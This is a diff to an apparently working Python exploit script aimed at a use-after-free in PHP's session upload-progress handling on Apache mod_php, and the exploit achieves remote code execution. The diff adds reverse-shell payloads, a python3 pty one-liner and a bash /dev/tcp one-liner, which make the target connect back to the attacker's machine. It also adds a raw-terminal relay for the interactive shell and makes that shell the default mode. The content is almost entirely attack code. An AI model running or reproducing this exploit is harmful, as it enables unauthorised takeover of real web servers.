@@ -28,7 +28,7 @@ Usage:
 Venue requirement unchanged: Apache mod_php. PHP >= 8.3-era 8.3.x
 (unpatched, or patched — the staleness gate is CVE-adjacent).
 """
-import argparse, os, re, socket, sys, threading, time
+import argparse, os, re, select, socket, sys, threading, time
 
 PROG = 'PHP_SESSION_UPLOAD_PROGRESS'
 BOUND = '----uaf'
@@ -84,10 +84,68 @@ def ls_bind(port_, backlog=1, tmo=6):
     s.bind(('0.0.0.0', port_)); s.listen(backlog); s.settimeout(tmo)
     return s
 
+def relay_stdin(conn, timeout=1800):
+    """Local stdin <-> socket until EOF either way. Terminal stdin goes raw so
+    ^C/^Z/arrows reach the target's pty; Ctrl-D (or `exit`) drops back."""
+    raw = sys.stdin.isatty()
+    fdin = sys.stdin.fileno()
+    if raw:
+        import termios, tty, signal
+        old = termios.tcgetattr(fdin)
+        tty.setraw(fdin)
+        old_sig = signal.getsignal(signal.SIGINT)
+        signal.signal(signal.SIGINT, signal.SIG_IGN)
+    try:
+        conn.setblocking(False)
+        cfd = conn.fileno()
+        while True:
+            r, _, _ = select.select([fdin, cfd], [], [], timeout)
+            if cfd in r:
+                try:
+                    d = conn.recv(4096)
+                except OSError:
+                    break
+                if not d:
+                    break
+                os.write(1, d)
+            if fdin in r:
+                try:
+                    b = os.read(fdin, 1024)
+                except OSError:
+                    b = b''
+                if not b:
+                    try:
+                        conn.shutdown(socket.SHUT_WR)
+                    except OSError:
+                        pass
+                    break
+                conn.sendall(b)
+    finally:
+        if raw:
+            signal.signal(signal.SIGINT, old_sig)
+            termios.tcsetattr(fdin, termios.TCSADRAIN, old)
+
+def pty_cmd(rhost, rport1):
+    # Double quotes outside / singles inside: escapeshellarg hands backslashes
+    # to python's parser literally (pitfall proven the hard way).
+    return ('python3 -c "import os,pty,socket;'
+            's=socket.create_connection((\'%s\',%d));'
+            '[os.dup2(s.fileno(),f) for f in (0,1,2)];'
+            'os.environ[\'TERM\']=\'vt100\';'
+            'pty.spawn([\'/bin/bash\',\'-i\'])"' % (rhost, rport1))
+
+def plain_cmd(rhost, rport1):
+    return "bash -c 'exec 4<>/dev/tcp/%s/%d; exec sh -i <&4 >&4 2>&4'" % (rhost, rport1)
+
 def run_once(host, port, rhost, rport, cmd, n, control=False, complete=False,
-             pubstate=False, mb=1800000, chunk=200000, delay=0.7, abort_at=0.55):
+             pubstate=False, shell=False, plain=False,
+             mb=1800000, chunk=200000, delay=0.7, abort_at=0.55):
     sid = ('uu%06d%06d' % (n + 1, (int(time.time()) * 1000) % 1000000))[:26]
     cookie = 'PHPSESSID=%s' % sid
+    rport1 = rport + 1
+    if pubstate and shell:
+        # the planted command IS the shell: it dials its own second socket
+        cmd = plain_cmd(rhost, rport1) if plain else pty_cmd(rhost, rport1)
 
     # R1: normal plant (completes; its entry is cleaned — stock behavior)
     r1 = (field(PROG, 'pl') + field('pl', cmd) + field('rh', '%s:%d' % (rhost, rport))
@@ -157,6 +215,7 @@ def run_once(host, port, rhost, rport, cmd, n, control=False, complete=False,
 
     # banner listener before R3
     ls = ls_bind(rport)
+    ls2 = ls_bind(rport1) if (pubstate and shell) else None
     box = []
     def relay():
         try:
@@ -183,11 +242,37 @@ def run_once(host, port, rhost, rport, cmd, n, control=False, complete=False,
         # window, the gate fires on published-state alone — no R2, no ini.
         body3 = (field(PROG, 'pl') + filehead('file', 'w.bin') + b'A' * 1024
                  + b'\r\n--' + BOUND.encode() + b'--\r\n')
-        resp3 = http(host, port, '/app.php?pl=1', body3, cookie=cookie)
+        if shell:
+            r3box = []
+            def fire():
+                try:
+                    r3box.append(http(host, port, '/app.php?pl=1', body3, cookie=cookie, timeout=1800))
+                except Exception as e:
+                    r3box.append('ERR %s' % e)
+            t3 = threading.Thread(target=fire, daemon=True); t3.start()
+            time.sleep(0.3)
+            try:
+                sh, _ = ls2.accept()
+                dialed = True
+            except socket.timeout:
+                sh, dialed = None, False
+            if dialed:
+                print('    shell up — Ctrl-D or `exit` to drop back', flush=True)
+                relay_stdin(sh)
+                try:
+                    sh.close()
+                except OSError:
+                    pass
+            t3.join(timeout=10)
+            resp3 = r3box[0] if r3box else ''
+        else:
+            resp3 = http(host, port, '/app.php?pl=1', body3, cookie=cookie)
     else:
-        resp3 = http(host, port, '/app.php?pl=1' if False else '/app.php', None, cookie=cookie)
+        resp3 = http(host, port, '/app.php', None, cookie=cookie)
     th.join(timeout=10)
     ls.close()
+    if ls2:
+        ls2.close()
     if t2:
         t2.join(timeout=45)
     resp2 = box2[0] if box2 else 'none'
@@ -204,12 +289,13 @@ def run_once(host, port, rhost, rport, cmd, n, control=False, complete=False,
 def main():
     ap = argparse.ArgumentParser(description='stock-config upload-progress UAF RCE')
     ap.add_argument('target', help='host[:port], port default 80')
-    ap.add_argument('--cmd', default='id -un; echo hello-from-stock')
+    ap.add_argument('--cmd', default=None, help='banner mode: run this cmd, output inline (default: interactive pty shell)')
     ap.add_argument('--rport', type=int, default=4455)
     ap.add_argument('--rhost', default=None)
     ap.add_argument('--n', type=int, default=1)
     ap.add_argument('--pubstate', action='store_true',
                     help='stock path on window-pre-starting builds: R3 is a tiny progress-field POST; gate fires on published-state')
+    ap.add_argument('--plain', action='store_true', help='sh -i via /dev/tcp instead of python pty (no python3 needed)')
     ap.add_argument('--control', action='store_true', help='no R2 at all: R3 should say NOENTRY')
     ap.add_argument('--complete', action='store_true', help='R2 completes: stock cleanup wipes the entry (frozen=-1)')
     args = ap.parse_args()
@@ -217,9 +303,16 @@ def main():
     port = int(port or 80)
     rhost = args.rhost or local_ip()
     good = 0
+    # Default = stock pubstate path (SHELL unless --cmd). --control/--complete
+    # are the staleness-era arms; they alone turn the pubstate path off.
+    pub = not (args.control or args.complete)
+    shell = pub and not args.cmd
     for i in range(args.n):
-        r = run_once(host, port, rhost, args.rport, args.cmd, i,
-                     control=args.control, complete=args.complete, pubstate=args.pubstate)
+        r = run_once(host, port, rhost, args.rport,
+                     args.cmd or 'id -un; echo hello-from-stock', i,
+                     control=args.control, complete=args.complete,
+                     pubstate=pub and not (args.control or args.complete),
+                     shell=shell, plain=args.plain)
         line = ('[%d/%d] ' % (i + 1, args.n) if args.n > 1 else '') + r['note']
         if r.get('banner'):
             line += '  <- ' + ' / '.join(r['banner'].splitlines())
